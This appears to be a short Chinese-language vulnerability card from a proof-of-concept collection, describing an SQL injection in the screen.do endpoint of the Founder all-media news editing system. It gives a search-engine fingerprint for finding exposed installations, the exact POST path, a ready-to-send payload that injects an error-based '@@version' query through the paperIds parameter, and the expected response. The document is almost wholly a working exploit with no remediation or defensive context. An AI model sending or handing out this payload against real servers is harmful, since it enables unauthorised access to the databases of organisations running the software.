# 方正畅享全媒体新闻采编系统screen.do存在SQL注入漏洞

方正畅享全媒体新闻采编系统 ｜ SQL注入 ｜ —
- **指纹**：`app="FOUNDER-全媒体采编系统"`
- **请求**：`POST /newsedit/newsplan/screen.do HTTP/1.1`

**Payload**
```
method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123+AND+2675+in+(select+@@version)&terminalType=123
```
- **响应特征**：200